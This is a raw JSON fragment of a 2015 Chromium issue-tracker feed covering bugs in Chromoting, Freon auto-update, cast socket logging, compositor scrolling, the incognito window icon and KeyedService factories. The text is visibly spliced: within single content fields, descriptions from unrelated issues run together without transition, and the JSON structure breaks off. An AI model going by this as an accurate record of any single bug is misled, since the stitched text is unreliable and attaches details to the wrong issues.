100).\r\n","type":"html"},"link":[{"rel":"replies","type":"application/atom+xml","href":"http://code.google.com/feeds/issues/p/chromium/issues/465891/comments/full"},{"rel":"alternate","type":"text/html","href":"http://code.google.com/p/chromium/issues/detail?id=465891"},{"rel":"self","type":"application/atom+xml","href":"https://code.google.com/feeds/issues/p/chromium/issues/full/465891"}],"author":[{"name":{"$t":"lambroslambrou@chromium.org"},"uri":{"$t":"/u/lambroslambrou@chromium.org/"}}],"issues$closedDate":{"$t":"2015-03-10T23:26:06.000Z"},"issues$id":{"$t":465891},"issues$label":[{"$t":"Type-Bug-Regression"},{"$t":"Pri-1"},{"$t":"Cr-Services-Chromoting"},{"$t":"OS-All"}],"issues$mergedInto":{"issues$id":{"$t":406612},"issues$project":{"$t":"chromium"}},"issues$owner":{"issues$uri":{"$t":"/u/jamiewalch@chromium.org/"},"issues$username":{"$t":"jamiewalch@chromium.org"}},"issues$stars":{"$t":2},"issues$state":{"$t":"closed"},"issues$status":{"$t":"Duplicate"}},{"gd$etag":"W/\"DEIGQn47eCl7ImA9XRRVEE8.\"","id":{"$t":"http://code.google.com/feeds/issues/p/chromium/issues/full/465890"},"published":{"$t":"2015-03-10T21:41:07.000Z"},"updated":{"$t":"2015-03-10T22:28:43.000Z"},"title":{"$t":"Freon doesn't auto-update to Freon build"},"content":{"$t":"Chrome Version       :  42.0.2311.38\r\nPlatform             :  6812.29.0 - parrot_freon, gnawty_freon\r\n\r\n\u003cb\u003eWhat steps will reproduce the problem?\u003c/b\u003e\n1. enter &quot;autest&quot; on the crosh to update ChromeOS.

It appears that errors are not being captured in the AuthTransportDelegate:\r\n\r\nhttps://code.google.com/p/chromium/codesearch#chromium/src/extensions/browser/api/cast_channel/cast_socket.cc&amp;rcl=1425983627&amp;l=473\r\n\r\nAlso, the socket event logged for this case includes the IP address of the device, which it should not (we only log the last octet).\r\n\r\nSocket event logs attached from a user report below.

This breaks Compositor's scrolling as it only creates scrolling layers for scrollables that are in frame's scrollable area set.\r\n\r\nPotential solutions:\r\n1. Anytime pointer-events property is changed we should ensure updateScrollableAreaSet is invoked for any scrollable that is affected by it (i.e., all scrollable children).\r\n2. Instead of testing hit test visibility only test for visibility. This needs to ensure that we do not break any other code that expects frame's scrollable area set to not include these.\r\n \r\n\r\n[1] https://code.google.com/p/chromium/codesearch#chromium/src/third_party/WebKit/Source/core/layout/LayerScrollableArea.cpp","type":"html"},"link":[{"rel":"replies","type":"application/atom+xml","href":"http://code.google.com/feeds/issues/p/chromium/issues/465719/comments/full"},{"rel":"alternate","type":"text/html","href":"http://code.google.com/p/chromium/issues/detail?id=465719"},{"rel":"self","type":"application/atom+xml","href":"https://code.google.com/feeds/issues/p/chromium/issues/full/465719"}],"author":[{"name":{"$t":"maji...@chromium.org"},"uri":{"$t":"/u/115611185144152085213/"}}],"issues$cc":[{"issues$uri":{"$t":"/u/102622162082382831750/"},"issues$username":{"$t":"rby...@chromium.org"}}],"issues$closedDate":{"$t":"2015-04-07T11:45:04.000Z"},"issues$id":{"$t":465719},"issues$label":[{"$t":"Type-Bug"},{"$t":"Pri-2"},{"$t":"Cr-Blink-Input"},{"$t":"Cr-Blink-Scroll"}],"issues$owner":{"issues$uri":{"$t":"/u/115611185144152085213/"},"issues$username":{"$t":"maji...@chromium.org"}},"issues$stars":{"$t":6},"issues$state":{"$t":"closed"},"issues$status":{"$t":"Fixed"}},{"gd$etag":"W/\"C08ARn47eCl7ImA9XRRVEEs.\"","id":{"$t":"http://code.google.com/feeds/issues/p/chromium/issues/full/465714"},"published":{"$t":"2015-03-10T13:56:49.000Z"},"updated":{"$t":"2015-03-11T08:17:27.000Z"},"title":{"$t":"Add an incognito- indicator to the icon of windows in incognito mode"},"content":{"$t":"UserAgent: Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.120 Chrome/37.0.2062.120 Safari/537.36\r\n\r\nSteps to reproduce the problem:\r\n* Open a normal chromium window, \r\n* open an incognito window\r\n* Use the task switcher to switch between the two.\r\n\r\nThe Icon is the same, you can not tell which is the one in privacy mode.\r\n\r\nTo identify the incognito window you need to switch to it.

If the KeyedServiceFactory is only instantiated after a Profile has been created i.e. if the first call to the ${SomeService}Factory::GetInstance() happens after the creation of a Profile, then the pref will not be registered or the service will not be created at profile creation time.\r\n\r\nThis currently does not manifest if any other service that has an early registration depends on the service.\r\n\r\nI think we should at least document this limitation in the KeyedService factory infrastructure (I didn't see there).
